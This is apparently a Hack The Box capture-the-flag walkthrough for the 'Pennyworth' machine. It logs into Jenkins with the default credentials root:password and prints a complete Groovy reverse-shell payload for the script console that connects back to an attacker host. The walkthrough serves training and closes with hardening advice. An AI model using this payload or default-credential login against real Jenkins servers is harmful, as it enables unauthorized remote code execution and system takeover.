---
title: "Pennyworth — Hack The Box Walkthrough"
description: "Exploiting default Jenkins credentials and Groovy script console RCE on Pennyworth."
date: 2026-09-02
category: offensive
readTime: "4 min read"
mitre:
  - "T1078"
  - "T1059"
tags:
  - "Hack The Box"
  - "Jenkins"
  - "Groovy"
  - "Default Credentials"
  - "Remote Code Execution"
  - "Linux"
  - "CTF"
summary: "Exploiting default Jenkins credentials and Groovy script console RCE on Pennyworth."
---

**Machine:** Pennyworth
**Difficulty:** Very Easy
**Key Techniques:** Jenkins default credentials, Groovy script console, remote code execution

---

## Enumeration

### Port Scanning

```bash
nmap -sV -p 8080 10.129.73.215
```

| Port | Service | Version |
|------|---------|---------|
| 8080 | http | Jetty 9.4.39.v20210325 |

`robots.txt` disallows `/`. The web root reveals a **Jenkins** login page.

---

## Exploitation

### Default Credentials

Jenkins instances often ship with default credentials. Trying:

```
root:password
```

Full admin access granted.

### Groovy Script Console

Navigate to `/script` — the Jenkins Groovy Script Console executes arbitrary code on the server.

Send a reverse shell payload:

```groovy
String host="<your-ip>";
int port=4444;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
  while(pi.available()>0) so.write(pi.read());
  while(pe.available()>0) so.write(pe.read());
  while(si.available()>0) po.write(si.read());
  so.flush();po.flush();
  Thread.sleep(50);
  try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

Catch the shell and grab the user flag:

```
user.txt: <flag>
```

### Privilege Escalation

Escalate to root and capture the root flag:

```
root.txt: <flag>
```

---

## Lessons Learned

1. **Change default Jenkins credentials immediately.** The `root:password` pair gave full admin control with no exploitation needed.
2. **Restrict or disable the Groovy Script Console** in production — it allows arbitrary code execution.
3. **Run Jenkins behind a reverse proxy with authentication** and keep it updated. The Jetty version (9.4.39) is outdated.
